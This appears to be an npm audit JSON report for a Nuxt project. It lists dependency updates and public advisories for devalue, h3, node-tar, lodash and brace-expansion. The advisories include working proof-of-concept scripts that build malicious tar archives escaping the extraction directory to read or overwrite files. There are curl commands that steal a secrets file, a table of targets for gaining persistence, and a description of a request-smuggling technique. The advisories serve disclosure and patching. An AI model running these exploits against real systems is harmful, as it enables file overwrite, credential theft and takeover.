{
  "actions": [
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112183,
          "path": ".>nuxt>devalue",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1112188,
          "path": ".>nuxt>devalue",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "devalue",
      "target": "5.6.2",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112186,
          "path": ".>@nuxt/eslint>@eslint/config-inspector>h3",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "h3",
      "target": "1.15.5",
      "depth": 4
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112255,
          "path": ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1112329,
          "path": ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1112659,
          "path": ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "tar",
      "target": "7.5.7",
      "depth": 7
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112455,
          "path": ".>nuxt>@nuxt/nitro-server>nitropack>archiver>archiver-utils>lodash",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "lodash",
      "target": "4.17.23",
      "depth": 7
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112862,
          "path": ".>@nuxt/eslint>@nuxt/eslint-config>eslint-plugin-import-x>minimatch>@isaacs/brace-expansion",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "@isaacs/brace-expansion",
      "target": "5.0.1",
      "depth": 6
    }
  ],
  "advisories": {
    "1112183": {
      "findings": [
        {
          "version": "5.6.1",
          "paths": [
            ".>nuxt>devalue"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/devalue/security/advisories/GHSA-g2pg-6438-jwpf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22775\n- https://github.com/sveltejs/devalue/commit/11755849fa0634ae294a15ec0aef2f43efcad7c4\n- https://github.com/sveltejs/devalue/releases/tag/v5.6.2\n- https://github.com/advisories/GHSA-g2pg-6438-jwpf",
      "created": "2026-01-15T22:15:18.000Z",
      "id": 1112183,
      "npm_advisory_id": null,
      "overview": "## Summary\n\nCertain inputs can cause `devalue.parse` to consume excessive CPU time and/or memory, potentially leading to denial of service in systems that parse input from untrusted sources. This affects applications using `devalue.parse` on externally-supplied data. The root cause is the `ArrayBuffer` hydration expecting base64 encoded strings as input, but not checking the assumption before decoding the input.\n\n## Details\n\nThe parser's `ArrayBuffer` hydration logic does not properly validate input before processing. Specially crafted inputs can cause disproportionate memory allocation or CPU usage on the receiving system.\n\n## Impact\n\nThis is a denial of service vulnerability affecting systems that use `devalue.parse` to handle data from potentially untrusted sources.\n\nAffected systems should upgrade to patched versions immediately.",
      "reported_by": null,
      "title": "devalue vulnerable to denial of service due to memory/CPU exhaustion in devalue.parse",
      "metadata": null,
      "cves": [
        "CVE-2026-22775"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "devalue",
      "vulnerable_versions": ">=5.1.0 <5.6.2",
      "github_advisory_id": "GHSA-g2pg-6438-jwpf",
      "recommendation": "Upgrade to version 5.6.2 or later",
      "patched_versions": ">=5.6.2",
      "updated": "2026-01-15T22:15:22.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-405"
      ],
      "url": "https://github.com/advisories/GHSA-g2pg-6438-jwpf"
    },
    "1112186": {
      "findings": [
        {
          "version": "1.15.4",
          "paths": [
            ".>@nuxt/eslint>@eslint/config-inspector>h3"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/h3js/h3/security/advisories/GHSA-mp2g-9vg9-f4cg\n- https://github.com/h3js/h3/releases/tag/v1.15.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23527\n- https://github.com/h3js/h3/commit/618ccf4f37b8b6148bea7f36040471af45bfb097\n- https://github.com/advisories/GHSA-mp2g-9vg9-f4cg",
      "created": "2026-01-15T20:10:51.000Z",
      "id": 1112186,
      "npm_advisory_id": null,
      "overview": "I was digging into h3 v1 (specifically v1.15.4) and found a critical HTTP Request Smuggling vulnerability.\n\nBasically, `readRawBody` is doing a strict case-sensitive check for the Transfer-Encoding header. It explicitly looks for \"chunked\", but per the RFC, this header should be case-insensitive.\n\n**The Bug**: If I send a request with Transfer-Encoding: ChuNked (mixed case), h3 misses it. Since it doesn't see \"chunked\" and there's no Content-Length, it assumes the body is empty and processes the request immediately.\n\nThis leaves the actual body sitting on the socket, which triggers a classic TE.TE Desync (Request Smuggling) if the app is running behind a Layer 4 proxy or anything that doesn't normalize headers (like AWS NLB or Node proxies).\n\n**Vulnerable Code** (`src/utils/body.ts`):\n\n```js\nif (\n    !Number.parseInt(event.node.req.headers[\"content-length\"] || \"\") &&\n    !String(event.node.req.headers[\"transfer-encoding\"] ?? \"\")\n      .split(\",\")\n      .map((e) => e.trim())\n      .filter(Boolean)\n      .includes(\"chunked\") // <--- This is the issue. \"ChuNkEd\" returns false here.\n  ) {\n    return Promise.resolve(undefined);\n  }\n```\n\nI verified this locally:\n\n- Sent a `Transfer-Encoding: ChunKed` request without a closing 0 chunk.\n- Express hangs (correctly waiting for data).\n- h3 responds immediately (vulnerable, thinks body is length 0).\n\n**Impact**: Since H3/Nuxt/Nitro is often used in containerized setups behind TCP load balancers, an attacker can use this to smuggle requests past WAFs or desynchronize the socket to poison other users' connections.\n\n**Fix**: Just need to normalize the header value before checking: ` .map((e) => e.trim().toLowerCase())`",
      "reported_by": null,
      "title": "h3 v1 has Request Smuggling (TE.TE) issue",
      "metadata": null,
      "cves": [
        "CVE-2026-23527"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "h3",
      "vulnerable_versions": "<=1.15.4",
      "github_advisory_id": "GHSA-mp2g-9vg9-f4cg",
      "recommendation": "Upgrade to version 1.15.5 or later",
      "patched_versions": ">=1.15.5",
      "updated": "2026-01-15T22:34:09.000Z",
      "cvss": {
        "score": 8.9,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:L"
      },
      "cwe": [
        "CWE-444"
      ],
      "url": "https://github.com/advisories/GHSA-mp2g-9vg9-f4cg"
    },
    "1112188": {
      "findings": [
        {
          "version": "5.6.1",
          "paths": [
            ".>nuxt>devalue"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/devalue/security/advisories/GHSA-vw5p-8cq8-m7mv\n- https://github.com/sveltejs/devalue/commit/11755849fa0634ae294a15ec0aef2f43efcad7c4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22774\n- https://github.com/sveltejs/devalue/commit/e46afa64dd2b25aa35fb905ba5d20cea63aabbf7\n- https://github.com/sveltejs/devalue/releases/tag/v5.6.2\n- https://github.com/advisories/GHSA-vw5p-8cq8-m7mv",
      "created": "2026-01-15T18:10:15.000Z",
      "id": 1112188,
      "npm_advisory_id": null,
      "overview": "## Summary\n\nCertain inputs can cause `devalue.parse` to consume excessive CPU time and/or memory, potentially leading to denial of service in systems that parse input from untrusted sources. This affects applications using `devalue.parse` on externally-supplied data. The root cause is the typed array hydration expecting an `ArrayBuffer` as input, but not checking the assumption before creating the typed array.\n\n## Details\n\nThe parser's typed array hydration logic does not properly validate input before processing. Specially crafted inputs can cause disproportionate memory allocation or CPU usage on the receiving system.\n\n## Impact\n\nThis is a denial of service vulnerability affecting systems that use `devalue.parse` to handle data from potentially untrusted sources.\n\nAffected systems should upgrade to patched versions immediately.",
      "reported_by": null,
      "title": "Devalue is vulnerable to denial of service due to memory exhaustion in devalue.parse",
      "metadata": null,
      "cves": [
        "CVE-2026-22774"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "devalue",
      "vulnerable_versions": ">=5.3.0 <=5.6.1",
      "github_advisory_id": "GHSA-vw5p-8cq8-m7mv",
      "recommendation": "Upgrade to version 5.6.2 or later",
      "patched_versions": ">=5.6.2",
      "updated": "2026-01-15T22:33:39.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-20",
        "CWE-405"
      ],
      "url": "https://github.com/advisories/GHSA-vw5p-8cq8-m7mv"
    },
    "1112255": {
      "findings": [
        {
          "version": "7.5.2",
          "paths": [
            ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
      "created": "2026-01-16T21:16:20.000Z",
      "id": 1112255,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
      "reported_by": null,
      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
      "metadata": null,
      "cves": [
        "CVE-2026-23745"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "tar",
      "vulnerable_versions": "<=7.5.2",
      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
      "recommendation": "Upgrade to version 7.5.3 or later",
      "patched_versions": ">=7.5.3",
      "updated": "2026-01-16T21:16:24.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22"
      ],
      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
    },
    "1112329": {
      "findings": [
        {
          "version": "7.5.2",
          "paths": [
            ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23950\n- https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6\n- https://github.com/advisories/GHSA-r6q2-hw4h-h46w",
      "created": "2026-01-21T01:05:49.000Z",
      "id": 1112329,
      "npm_advisory_id": null,
      "overview": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
      "reported_by": null,
      "title": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
      "metadata": null,
      "cves": [
        "CVE-2026-23950"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "tar",
      "vulnerable_versions": "<=7.5.3",
      "github_advisory_id": "GHSA-r6q2-hw4h-h46w",
      "recommendation": "Upgrade to version 7.5.4 or later",
      "patched_versions": ">=7.5.4",
      "updated": "2026-01-21T01:05:50.000Z",
      "cvss": {
        "score": 8.8,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
      },
      "cwe": [
        "CWE-176"
      ],
      "url": "https://github.com/advisories/GHSA-r6q2-hw4h-h46w"
    },
    "1112455": {
      "findings": [
        {
          "version": "4.17.21",
          "paths": [
            ".>nuxt>@nuxt/nitro-server>nitropack>archiver>archiver-utils>lodash"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg",
      "created": "2026-01-21T23:01:22.000Z",
      "id": 1112455,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
      "reported_by": null,
      "title": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions",
      "metadata": null,
      "cves": [
        "CVE-2025-13465"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "lodash",
      "vulnerable_versions": ">=4.0.0 <=4.17.22",
      "github_advisory_id": "GHSA-xxjr-mmjv-4gpg",
      "recommendation": "Upgrade to version 4.17.23 or later",
      "patched_versions": ">=4.17.23",
      "updated": "2026-01-21T23:01:23.000Z",
      "cvss": {
        "score": 6.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
      },
      "cwe": [
        "CWE-1321"
      ],
      "url": "https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"
    },
    "1112659": {
      "findings": [
        {
          "version": "7.5.2",
          "paths": [
            ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24842\n- https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46\n- https://github.com/advisories/GHSA-34x7-hfp2-rc4v",
      "created": "2026-01-28T16:35:31.000Z",
      "id": 1112659,
      "npm_advisory_id": null,
      "overview": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration & Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets",
      "reported_by": null,
      "title": "node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal",
      "metadata": null,
      "cves": [
        "CVE-2026-24842"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "tar",
      "vulnerable_versions": "<7.5.7",
      "github_advisory_id": "GHSA-34x7-hfp2-rc4v",
      "recommendation": "Upgrade to version 7.5.7 or later",
      "patched_versions": ">=7.5.7",
      "updated": "2026-01-28T16:35:31.000Z",
      "cvss": {
        "score": 8.2,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
      },
      "cwe": [
        "CWE-22",
        "CWE-59"
      ],
      "url": "https://github.com/advisories/GHSA-34x7-hfp2-rc4v"
    },
    "1112862": {
      "findings": [
        {
          "version": "5.0.0",
          "paths": [
            ".>@nuxt/eslint>@nuxt/eslint-config>eslint-plugin-import-x>minimatch>@isaacs/brace-expansion"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/brace-expansion/security/advisories/GHSA-7h2j-956f-4vf2\n- https://github.com/advisories/GHSA-7h2j-956f-4vf2",
      "created": "2026-02-03T19:41:15.000Z",
      "id": 1112862,
      "npm_advisory_id": null,
